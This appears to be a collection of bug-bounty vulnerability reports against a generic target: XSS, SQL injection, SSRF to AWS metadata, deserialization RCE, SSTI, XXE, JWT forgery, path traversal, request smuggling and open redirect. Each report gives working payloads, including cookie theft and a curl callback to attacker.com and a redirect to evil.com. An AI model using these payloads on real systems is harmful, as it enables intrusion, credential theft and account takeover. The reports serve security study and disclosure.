title: Reflected XSS in search parameter via unsanitized user input
vuln_info:
## Summary
A reflected XSS vulnerability was discovered in the search functionality. The `q` parameter was reflected directly into the HTML response without proper sanitization.

## Steps To Reproduce
1. Navigate to https://target.com/search?q=test
2. Replace the value of `q` with `<script>alert(document.cookie)</script>`
3. The script executes in the victim's browser

## Impact
An attacker can steal session cookies, redirect users to phishing sites, or perform actions on behalf of the victim. This can lead to account takeover if session tokens are accessible.

title: SQL Injection in user profile endpoint allows database extraction
vuln_info:
## Summary
A SQL injection vulnerability was found in the `/api/users/profile` endpoint. The `user_id` parameter is passed directly to a SQL query without parameterization.

## Steps To Reproduce
1. Send GET request to `/api/users/profile?user_id=1`
2. Modify `user_id` to `1' UNION SELECT username,password,3 FROM users--`
3. Response contains all usernames and hashed passwords from the database

## Proof of Concept
```
GET /api/users/profile?user_id=1' UNION SELECT table_name,2,3 FROM information_schema.tables-- HTTP/1.1
Host: target.com
```

## Impact
Complete database extraction including user credentials, PII, and application secrets. This leads to full compromise of all user accounts.

title: SSRF via URL parameter allows access to AWS metadata service
vuln_info:
## Summary
The image import feature at `/api/import-image` makes server-side HTTP requests to user-supplied URLs without validation, allowing SSRF to the AWS EC2 metadata endpoint.

## Steps To Reproduce
1. Send POST request to `/api/import-image` with body: `{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`
2. Response includes available IAM role names
3. Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
4. Response includes `AccessKeyId`, `SecretAccessKey`, and `Token`

## Impact
Full AWS credential extraction enabling complete cloud infrastructure takeover. Attacker can read S3 buckets, access RDS databases, and pivot to other AWS services.

title: IDOR vulnerability allows access to other users private data via API
vuln_info:
## Summary
The `/api/v2/orders/{order_id}` endpoint does not verify that the requesting user owns the order. By enumerating order IDs, an attacker can view other users' order details including PII.

## Steps To Reproduce
1. Log in as user A and create an order — note the order ID (e.g., 10045)
2. Log in as user B
3. Send `GET /api/v2/orders/10044` (adjacent ID belonging to user A)
4. Response returns full order details including name, address, and payment info

## Impact
Mass exposure of customer PII including home addresses, phone numbers, and partial payment information for all users. An attacker can enumerate all orders by iterating IDs.

title: Remote Code Execution via unsafe deserialization in session handling
vuln_info:
## Summary
The application deserializes user-controlled session data using Java's native ObjectInputStream without any validation. By crafting a malicious serialized payload using gadget chains (ysoserial), arbitrary code execution is achievable.

## Steps To Reproduce
1. Generate payload: `java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64`
2. Set the session cookie to the base64-encoded payload
3. Send any authenticated request
4. Server receives connection from attacker.com confirming RCE

## Impact
Full server compromise. Attacker can read all data, install backdoors, pivot to internal network, and achieve persistent access.

title: Stored XSS in profile bio field leads to account takeover
vuln_info:
## Summary
The user profile bio field stores and renders unsanitized HTML. By injecting a script that exfiltrates the viewer's cookies, any user who views the malicious profile is compromised.

## Steps To Reproduce
1. Update bio to: `<script>new Image().src='https://attacker.com/?c='+document.cookie</script>`
2. Share profile URL to target victim
3. When victim views profile, their session cookie is sent to attacker
4. Attacker uses stolen cookie to hijack session

## Impact
One-click account takeover. Can be scaled to a worm that spreads across social connections.

title: XXE injection in XML document upload leads to internal file read
vuln_info:
## Summary
The document import feature accepts XML files and processes them with an XML parser that has external entity processing enabled. By crafting a malicious XML file with an external entity referencing internal files, sensitive data can be extracted.

## Steps To Reproduce
1. Create a file with content:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document><content>&xxe;</content></document>
```
2. Upload via POST /api/import
3. Response includes contents of /etc/passwd

## Impact
Read arbitrary files on the server including configuration files with database credentials and private keys.

title: SSTI in email template engine allows RCE via Jinja2 injection
vuln_info:
## Summary
The email customization feature allows users to inject Jinja2 template expressions into email subjects. The input is passed directly to the Jinja2 render engine without sandboxing.

## Steps To Reproduce
1. Navigate to email customization settings
2. Set email subject to: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
3. Trigger a test email
4. Email subject contains the output of `id` command

## PoC for RCE:
`{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}`

## Impact
Full remote code execution on the application server. Complete system compromise.

title: Authentication bypass via JWT algorithm confusion (none algorithm)
vuln_info:
## Summary
The application accepts JWT tokens with the 'none' algorithm, allowing an attacker to forge tokens for any user without knowing the signing secret.

## Steps To Reproduce
1. Obtain a valid JWT token by logging in
2. Decode the JWT (base64)
3. Change the algorithm in the header to 'none'
4. Change the user_id in the payload to target user (e.g., admin)
5. Remove the signature (keep trailing dot)
6. Re-encode and use as Bearer token

## Payload:
`eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxfQ.` (admin access)

## Impact
Complete authentication bypass. Attacker can impersonate any user including administrators.

title: Path traversal in file download endpoint exposes server files
vuln_info:
## Summary
The file download endpoint `/api/download?file=` does not properly sanitize the filename parameter, allowing path traversal to read arbitrary files.

## Steps To Reproduce
1. Send GET `/api/download?file=../../../etc/passwd`
2. Server returns contents of /etc/passwd
3. Try `/api/download?file=../../../var/www/html/.env`
4. Returns application environment file with DB credentials and API keys

## Bypasses:
- URL encoding: `..%2F..%2F..%2Fetc%2Fpasswd`
- Double encoding: `..%252F..%252F..%252Fetc%252Fpasswd`

## Impact
Read server-side files including source code, credentials, and configuration data.

title: HTTP Request Smuggling via CL.TE desync leads to cache poisoning
vuln_info:
## Summary
The application is vulnerable to HTTP request smuggling due to discrepancy in how the front-end proxy and back-end server interpret Transfer-Encoding and Content-Length headers.

## Steps To Reproduce
1. Send the following request:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: x
```
2. Send a follow-up normal request
3. The smuggled request causes the follow-up to be treated as accessing /admin

## Impact
Cache poisoning, request hijacking, bypassing security controls, and accessing internal endpoints.

title: Open redirect in OAuth callback parameter enables phishing
vuln_info:
## Summary
The OAuth `redirect_uri` parameter is not properly validated, allowing redirection to any external domain after authentication. This enables credential phishing using the trusted domain as a relay.

## Steps To Reproduce
1. Craft OAuth URL: `https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://evil.com&response_type=code`
2. Send link to victim
3. After victim authenticates, they are redirected to evil.com with the auth code
4. Attacker exchanges code for access token

## Impact
OAuth token theft leading to account takeover. Effective phishing because URL starts with trusted domain.
